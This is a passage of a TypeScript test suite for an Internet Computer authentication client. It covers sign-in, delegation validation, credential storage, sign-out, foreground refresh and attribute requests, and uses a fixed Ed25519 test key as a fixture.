    expect(await storage.get(SLOTS.app)).not.toBeNull();
  });

  it('records the account the mint reported, not the session chain it was signed with', async () => {
    const stateStorage = new MemoryStateStorage();
    const client = new AuthClient({ stateStorage });
    handleSignIn(FakeTransport.last());

    const identity = await client.signIn();

    // The session chain is rooted at the session's own key; only a mint reports
    // the key an application's canisters see.
    const accountDer = minted.accountKey?.getPublicKey().toDer();
    const account = Principal.selfAuthenticating(new Uint8Array(accountDer ?? []));
    expect(stateStorage.get()?.principal.toText()).toBe(account.toText());
    expect(identity.getPrincipal().toText()).toBe(account.toText());
  });

  it('refuses a session chain issued to a different key', async () => {
    const client = new AuthClient({});
    const other = Ed25519KeyIdentity.generate();
    handleSignIn(FakeTransport.last(), {
      result: encodeDelegationChainResponse(
        await DelegationChain.create(
          Ed25519KeyIdentity.generate(),
          other.getPublicKey(),
          new Date(Date.now() + 3.6e6),
          { targets: [II_CANISTER] },
        ),
      ),
    });

    await expect(client.signIn()).rejects.toThrow(/does not delegate to the key/);
  });

  it('replaces the app credential rather than clearing it while signing in', async () => {
    const storage = spyStorage();
    const client = new AuthClient({
      credentialStorage: storage,
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    const first = await storage.get(SLOTS.app);

    handleSignIn(FakeTransport.last());
    await client.signIn();

    // The slot every tab of this origin reads is never emptied: a ceremony mints
    // into its own slot and the promotion overwrites, so a sign-in that failed
    // would have cost the other tabs nothing.
    expect(storage.remove).not.toHaveBeenCalledWith(SLOTS.app);
    expect((await storage.get(SLOTS.app))?.chain?.toJSON()).not.toEqual(first?.chain?.toJSON());
    // And the ceremony's own slot does not outlive it.
    expect(await storage.get(SLOTS.appPending)).toBeNull();
  });

  it('leaves the shared app credential alone when a ceremony fails', async () => {
    const storage = spyStorage();
    const client = new AuthClient({
      credentialStorage: storage,
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    const before = await storage.get(SLOTS.app);

    // A ceremony that never resolves: nothing shared may change on its account.
    minted.refuse = true;
    await expect(client.signIn()).rejects.toThrow();
    minted.refuse = false;

    expect((await storage.get(SLOTS.app))?.chain?.toJSON()).toEqual(before?.chain?.toJSON());
  });

  it('ends the session at the canister when signing out', async () => {
    const client = new AuthClient({});
    handleSignIn(FakeTransport.last());
    await client.signIn();
    const before = minted.revoked;

    await client.signOut();

    expect(minted.revoked).toBe(before + 1);
  });

  it('carries the configured canister and agent options to the minter', async () => {
    const canisterId = Principal.fromText('aaaaa-aa');
    const agentOptions = { host: 'https://example.test' };
    const client = new AuthClient({
      identityProvider: { canisterId },
      agentOptions,
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    expect(minted.createdWith.at(-1)).toEqual({ canisterId, agentOptions });
  });

  it('takes the mint lock away on sign-out instead of queueing on it', async () => {
    const stolen: { name: string; steal: boolean }[] = [];
    const request = vi.fn(async (name: string, optionsOrRun: unknown, maybeRun?: () => unknown) => {
      const options = (typeof optionsOrRun === 'function' ? {} : optionsOrRun) as {
        steal?: boolean;
      };
      const run = (typeof optionsOrRun === 'function' ? optionsOrRun : maybeRun) as () => unknown;
      stolen.push({ name, steal: options.steal === true });
      return run();
    });
    vi.stubGlobal('navigator', { locks: { request } });

    const credentialStorage = new IdbCredentialStorage(); // shared === true
    const client = new AuthClient({
      credentialStorage,
      namespace: 'one',
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();

    await client.signOut();

    // Stolen, not queued: a sign-out must not wait on another tab's canister
    // call. And named from the namespace, like everything else the client writes.
    expect(stolen).toContainEqual({ name: 'one:app', steal: true });
  });

  it('does not touch the lock on sign-out where no other tab can read the store', async () => {
    const request = vi.fn(async (_name: string, _options: unknown, run: () => unknown) => run());
    vi.stubGlobal('navigator', { locks: { request } });

    const client = new AuthClient({
      credentialStorage: new MemoryCredentialStorage(), // shared === false,
    });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    request.mockClear();

    await client.signOut();

    // Nothing else can be holding it, so there is nothing to take away.
    expect(request).not.toHaveBeenCalled();
  });

  it('clears both credentials on sign-out, not just the session', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    const client = new AuthClient({ credentialStorage });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    expect(await credentialStorage.get(SLOTS.app)).not.toBeNull();

    await client.signOut();

    // Teardown covers every slot rather than whichever one a caller names, so a
    // delegation cannot outlive the sign-in it was minted under.
    expect(await credentialStorage.get(SLOTS.session)).toBeNull();
    expect(await credentialStorage.get(SLOTS.app)).toBeNull();
  });

  it('mints on the page load that restores a session, before any request', async () => {
    // Memory-backed: these tests move a fake clock, and IndexedDB does not
    // settle while one is installed.
    const credentialStorage = new MemoryCredentialStorage();
    const stateStorage = new MemoryStateStorage();
    const first = new AuthClient({ credentialStorage, stateStorage });
    handleSignIn(FakeTransport.last());
    await first.signIn();
    first.dispose();

    // Put the store in the state a spent delegation leaves it in, so this load is
    // due a mint. The removal is TAB-5's own, covered in session-identity.test.ts.
    await credentialStorage.remove(SLOTS.app);
    minted.count = 0;
    const restored = new AuthClient({ credentialStorage, stateStorage });

    // `pageshow` fires as part of the load, which is before the asynchronous
    // restore has produced an identity. The refresh has to wait for it, or the
    // load mints nothing and the first user action pays for the round trip.
    globalThis.dispatchEvent(new Event('pageshow'));
    for (let i = 0; i < 200 && minted.count === 0; i++) {
      await new Promise((resolve) => setTimeout(resolve, 5));
    }

    expect(minted.count).toBeGreaterThan(0);
    restored.dispose();
  });

  it('mints when the tab comes back, if one is due', async () => {
    const client = new AuthClient({ credentialStorage: new MemoryCredentialStorage() });
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    // The clock moves while the tab is in the background; its own timers do not
    // run, which is the case this trigger exists for.
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(new Date(Date.now() + 4 * 60 * 1000 + 50_000));
    document.dispatchEvent(new Event('visibilitychange'));
    for (let turn = 0; turn < 100 && identity.getDelegation() === held; turn++) {
      await new Promise((resolve) => setTimeout(resolve, 1));
    }
    vi.useRealTimers();

    expect(identity.getDelegation()).not.toBe(held);
    client.dispose();
  });

  it('mints when the user does something, if one is due', async () => {
    const client = new AuthClient({ credentialStorage: new MemoryCredentialStorage() });
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    // A user reading rather than clicking still keeps the session alive, which is
    // what a bound on how long it goes unminted needs in order to be safe.
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(new Date(Date.now() + 4 * 60 * 1000 + 50_000));
    document.dispatchEvent(new Event('mousemove'));
    for (let turn = 0; turn < 100 && identity.getDelegation() === held; turn++) {
      await new Promise((resolve) => setTimeout(resolve, 1));
    }
    vi.useRealTimers();

    expect(identity.getDelegation()).not.toBe(held);
    client.dispose();
  });

  it('mints once for a burst of activity, not once per event', async () => {
    const client = new AuthClient({ credentialStorage: new MemoryCredentialStorage() });
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(new Date(Date.now() + 4 * 60 * 1000 + 50_000));
    // A hand resting on a mouse, which is dozens of events a second.
    for (let event = 0; event < 50; event++) {
      document.dispatchEvent(new Event('mousemove'));
    }
    for (let turn = 0; turn < 100 && identity.getDelegation() === held; turn++) {
      await new Promise((resolve) => setTimeout(resolve, 1));
    }
    const afterBurst = identity.getDelegation();

    // The hand is still resting, and the delegation it just earned has its full
    // life left. The pre-mint threshold is the throttle: nothing further is due,
    // so the events cost nothing.
    for (let event = 0; event < 50; event++) {
      document.dispatchEvent(new Event('mousemove'));
    }
    for (let turn = 0; turn < 20; turn++) {
      await new Promise((resolve) => setTimeout(resolve, 1));
    }
    vi.useRealTimers();

    expect(afterBurst).not.toBe(held);
    expect(identity.getDelegation()).toBe(afterBurst);
    client.dispose();
  });

  it('does not refresh the identity a ceremony is in the middle of replacing', async () => {
    const client = new AuthClient({ credentialStorage: new MemoryCredentialStorage() });
    // Answers the first ceremony only, so the second stays in flight.
    let answered = 0;
    FakeTransport.last().onRequest(async (req) => {
      if (req.method !== 'ii_session_delegation' || req.id == null) return;
      if (answered++ > 0) return;
      return { jsonrpc: '2.0', id: req.id, ...(await conformantSignInBody(req.params as never)) };
    });
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    // A ceremony in flight. A redirect backgrounds the tab and foregrounds it
    // again on the way back, which is this event; without the guard it would
    // mint for the session the ceremony is replacing.
    const inFlight = client.signIn().catch(() => undefined);
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(new Date(Date.now() + 4 * 60 * 1000 + 50_000));
    document.dispatchEvent(new Event('visibilitychange'));
    for (let turn = 0; turn < 20; turn++) await new Promise((resolve) => setTimeout(resolve, 1));
    vi.useRealTimers();

    // Asserted on this client's own identity: the event reaches every client the
    // suite has left hooked to this document, so a global mint count would not
    // say which one minted.
    expect(identity.getDelegation()).toBe(held);
    client.dispose();
    void inFlight;
  });

  it('installs nothing when disposed while the restore is in flight', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    const stateStorage = new MemoryStateStorage();
    const first = new AuthClient({ credentialStorage, stateStorage });
    handleSignIn(FakeTransport.last());
    await first.signIn();
    first.dispose();

    // The constructor starts the restore without awaiting it, so this disposes
    // one that is still resolving.
    const second = new AuthClient({ credentialStorage, stateStorage });
    second.dispose();
    const identity = await second.getIdentity();

    // An identity installed after dispose would schedule refreshes nothing stops.
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
  });

  it('stays silent when the restore itself fails', async () => {
    const credentialStorage = spyStorage();
    credentialStorage.get = vi.fn().mockRejectedValue(new Error('storage unavailable'));
    const client = new AuthClient({ credentialStorage });

    // Nothing is waiting on a foreground refresh, so a failed restore must not
    // surface as an unhandled rejection from the event handler.
    globalThis.dispatchEvent(new Event('pageshow'));
    await new Promise((resolve) => setTimeout(resolve, 10));

    expect(client.isAuthenticated()).toBe(false);
    client.dispose();
  });

  it('costs nothing to glance at a tab whose delegation is healthy', async () => {
    const client = new AuthClient({ credentialStorage: new MemoryCredentialStorage() });
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    document.dispatchEvent(new Event('visibilitychange'));
    await Promise.resolve();

    expect(identity.getDelegation()).toBe(held);
    client.dispose();
  });

  it('hooks nothing when foreground refresh is turned off', async () => {
    const client = new AuthClient({
      disableForegroundRefresh: true,
      credentialStorage: new MemoryCredentialStorage(),
    });
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;
    const held = identity.getDelegation();

    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(new Date(Date.now() + 4 * 60 * 1000 + 50_000));
    document.dispatchEvent(new Event('visibilitychange'));
    for (let turn = 0; turn < 20; turn++) await new Promise((resolve) => setTimeout(resolve, 1));
    vi.useRealTimers();

    expect(identity.getDelegation()).toBe(held);
    client.dispose();
  });

  it('keeps the shared record when a mint finds the session gone, and stops claiming it', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    // The distinction only exists for a record that reaches past this origin.
    const stateStorage = new CookieStateStorage({ domain: 'localhost' });
    const client = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    handleSignIn(FakeTransport.last());
    const identity = (await client.signIn()) as SessionIdentity;

    // As a sibling replacing the browser's session leaves it: this origin's
    // chain is dead, but the record that sibling just wrote is not.
    minted.refuse = true;
    vi.useFakeTimers({ toFake: ['Date'] });
    vi.setSystemTime(new Date(Date.now() + 4 * 60 * 1000 + 50_000));
    await identity.refresh();
    vi.useRealTimers();
    minted.refuse = false;

    expect(await credentialStorage.get(SLOTS.session)).toBeNull();
    // Retracting this would tell the sibling that did sign in that its session
    // is gone. It stands, and this origin simply stops claiming it.
    expect(stateStorage.get()).not.toBeNull();
    expect(stateStorage.get()?.held).toBe(false);
    expect(client.isAuthenticated()).toBe(false);
    client.dispose();
  });

  it('drops the app credential too when the state names another account', async () => {
    const credentialStorage = new MemoryCredentialStorage();
    const stateStorage = new MemoryStateStorage();
    const first = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    handleSignIn(FakeTransport.last());
    await first.signIn();

    stateStorage.set({
      principal: Principal.selfAuthenticating(new Uint8Array([9, 9, 9])),
      expiration: (BigInt(Date.now()) + 3_600_000n) * 1_000_000n,
    });

    const second = new AuthClient({
      credentialStorage,
      stateStorage,
    });
    await second.getIdentity();

    // Restoring reads the app slot and may mint into it, so a credential rooted
    // at the account the state no longer names must not be left behind.
    expect(await credentialStorage.get(SLOTS.session)).toBeNull();
    expect(await credentialStorage.get(SLOTS.app)).toBeNull();
  });

  it('refuses to hand out an identity this origin cannot act with', async () => {
    // What a sibling subdomain has on its first load: the shared record, and no
    // credential of its own.
    const stateStorage = new CookieStateStorage({ domain: 'localhost' });
    const signedIn = new AuthClient({ stateStorage });
    handleSignIn(FakeTransport.last());
    await signedIn.signIn();
    signedIn.dispose();

    localStorage.clear(); // the sibling has no local record; the cookie stands
    const sibling = new AuthClient({
      stateStorage,
      credentialStorage: new MemoryCredentialStorage(),
    });

    expect(stateStorage.get()).not.toBeNull();
    expect(sibling.isAuthenticated()).toBe(false);
    // Anonymous here would send unauthenticated calls while the record says
    // someone is signed in.
    await expect(sibling.getIdentity()).rejects.toThrow(SessionNotHeldError);
    sibling.dispose();
  });

  it('clears the state storage on sign-out', async () => {
    const stateStorage = new MemoryStateStorage();
    const client = new AuthClient({ stateStorage });
    handleSignIn(FakeTransport.last());
    await client.signIn();
    expect(stateStorage.get()).not.toBeNull();

    await client.signOut();

    expect(stateStorage.get()).toBeNull();
  });
});

describe('IdbCredentialStorage', () => {
  it('should handle get and set', async () => {
    const storage = new IdbCredentialStorage();
    const identity = await storage.create();
    const chain = await createTestDelegation(Ed25519KeyIdentity.generate());
    await storage.set(SLOTS.session, { identity, chain });

    const stored = await storage.get(SLOTS.session);
    expect(stored?.identity.getPublicKey().toDer()).toEqual(identity.getPublicKey().toDer());
    expect(stored?.chain?.toJSON()).toEqual(chain.toJSON());
  });
});

describe('Session restoration', () => {
  const testSecrets = [
    '302a300506032b6570032100d1fa89134802051c8b5d4e53c08b87381b87097bca4c4f348611eb8ce6c91809',
    '4bbff6b476463558d7be318aa342d1a97778d70833038680187950e9e02486c0d1fa89134802051c8b5d4e53c08b87381b87097bca4c4f348611eb8ce6c91809',
  ];

  it('should restore an existing Ed25519Key and delegation', async () => {
    vi.setSystemTime(new Date('2020-01-01T00:00:00.000Z'));

    const expiration = new Date('2020-01-03T00:00:00.000Z');
    const key = Ed25519KeyIdentity.fromJSON(JSON.stringify(testSecrets));
    const chain = await createTestDelegation(key, expiration);

    const client = new AuthClient({
      credentialStorage: spyStorage({ identity: key, chain }),
      stateStorage: stateFor(chain),
    });
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(false);
  });

  it('should remain anonymous with a key but no delegation', async () => {
    vi.setSystemTime(new Date('2020-01-01T00:00:00.000Z'));

    const key = Ed25519KeyIdentity.fromJSON(JSON.stringify(testSecrets));
    // A record with no chain is only legal in a ceremony's own slot, so one
    // found under the session slot is not a session, and is cleared.
    const storage = spyStorage({ identity: key });
    const client = new AuthClient({ credentialStorage: storage });

    const identity = await client.getIdentity();

    expect(identity.getPrincipal().isAnonymous()).toBe(true);
    expect(storage.remove).toHaveBeenCalledWith(SLOTS.session);
    expect(await storage.get(SLOTS.session)).toBeNull();
  });

  it('should clear storage when the delegation has expired', async () => {
    vi.setSystemTime(new Date('2020-01-01T00:00:00.000Z'));

    const expiration = new Date('2019-12-30T00:00:00.000Z');
    const key = Ed25519KeyIdentity.fromJSON(JSON.stringify(testSecrets));
    const chain = await createTestDelegation(key, expiration);

    const storage = spyStorage({ identity: key, chain });

    const client = new AuthClient({ credentialStorage: storage });
    const identity = await client.getIdentity();
    expect(identity.getPrincipal().isAnonymous()).toBe(true);
    expect(storage.remove).toHaveBeenCalled();
  });
});

describe('AuthClient requestAttributes', () => {
  it('should send a JSON-RPC request and return decoded data and signature', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    const nonce = new Uint8Array(32).fill(1);
    const result = await client.requestAttributes({
      keys: ['email', 'name'],
      nonce: () => Promise.resolve(nonce),
    });

    const sent = transport.requests[0];
    expect(sent.method).toBe('ii-icrc3-attributes');
    expect(sent.params?.keys).toEqual(['email', 'name']);
    expect(sent.params?.nonce).toBe(btoa(String.fromCharCode(...nonce)));
    expect(Array.from(result.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
    expect(Array.from(result.signature)).toEqual(Array.from(new TextEncoder().encode('sig')));
  });

  it('should use a provided nonce', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    const nonce = new Uint8Array(32).fill(42);
    await client.requestAttributes({ keys: ['email'], nonce: () => Promise.resolve(nonce) });

    expect(transport.requests[0].params?.nonce).toBe(btoa(String.fromCharCode(...nonce)));
  });

  it('should forward different nonces as distinct base64 values', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(new Uint8Array(32).fill(1)),
    });
    await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(new Uint8Array(32).fill(2)),
    });

    expect(transport.requests[0].params?.nonce).not.toBe(transport.requests[1].params?.nonce);
  });

  it('should throw when the response contains an error', async () => {
    const client = new AuthClient();
    handleRequestAttributes(FakeTransport.last(), {
      error: { code: -1, message: 'not supported' },
    });

    const nonce = new Uint8Array(32).fill(1);
    await expect(
      client.requestAttributes({ keys: ['email'], nonce: () => Promise.resolve(nonce) }),
    ).rejects.toThrow('not supported');
  });

  it('should throw when the response is missing data or signature', async () => {
    const client = new AuthClient();
    handleRequestAttributes(FakeTransport.last(), { result: { data: btoa('hello') } });

    const nonce = new Uint8Array(32).fill(1);
    await expect(
      client.requestAttributes({ keys: ['email'], nonce: () => Promise.resolve(nonce) }),
    ).rejects.toThrow('Invalid response: missing data or signature');
  });

  it('should accept a nonce callback returning a promise and forward the resolved value', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    const nonceBytes = new Uint8Array(32).fill(7);
    const result = await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(nonceBytes),
    });

    expect(transport.requests[0].params?.nonce).toBe(btoa(String.fromCharCode(...nonceBytes)));
    expect(Array.from(result.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
  });

  it('should open the transport channel before awaiting a nonce promise', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleRequestAttributes(transport);

    const establishOrder: string[] = [];
    const originalEstablish = transport.establishChannel.bind(transport);
    transport.establishChannel = async () => {
      establishOrder.push('establish');
      return originalEstablish();
    };

    const nonceBytes = new Uint8Array(32).fill(9);
    const noncePromise = new Promise<Uint8Array>((resolve) => {
      // Resolving in a later microtask so the channel has time to open first.
      queueMicrotask(() => {
        establishOrder.push('resolve-nonce');
        resolve(nonceBytes);
      });
    });

    await client.requestAttributes({ keys: ['email'], nonce: () => noncePromise });

    expect(establishOrder).toEqual(['establish', 'resolve-nonce']);
    expect(transport.requests[0].params?.nonce).toBe(btoa(String.fromCharCode(...nonceBytes)));
  });

  it('should propagate rejection from a nonce promise', async () => {
    const client = new AuthClient();
    handleRequestAttributes(FakeTransport.last());

    await expect(
      client.requestAttributes({ keys: ['email'], nonce: () => Promise.reject(new Error('boom')) }),
    ).rejects.toThrow('boom');
  });
});

describe('AuthClient signIn + requestAttributes', () => {
  it('should resolve both when issued in parallel', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);
    handleRequestAttributes(transport);

    const [identity, attributes] = await Promise.all([
      client.signIn(),
      client.requestAttributes({
        keys: ['email'],
        nonce: () => Promise.resolve(new Uint8Array(32).fill(1)),
      }),
    ]);

    expect(identity.getPrincipal().isAnonymous()).toBe(false);
    expect(Array.from(attributes.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
  });

  it('should resolve requestAttributes after a completed signIn', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);
    handleRequestAttributes(transport);

    const identity = await client.signIn();
    const attributes = await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(new Uint8Array(32).fill(1)),
    });

    expect(identity.getPrincipal().isAnonymous()).toBe(false);
    expect(Array.from(attributes.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
  });

  it('should resolve signIn after a completed requestAttributes', async () => {
    const client = new AuthClient();
    const transport = FakeTransport.last();
    handleSignIn(transport);
    handleRequestAttributes(transport);

    const attributes = await client.requestAttributes({
      keys: ['email'],
      nonce: () => Promise.resolve(new Uint8Array(32).fill(1)),
    });
    const identity = await client.signIn();

    expect(Array.from(attributes.data)).toEqual(Array.from(new TextEncoder().encode('hello')));
    expect(identity.getPrincipal().isAnonymous()).toBe(false);
  });
});
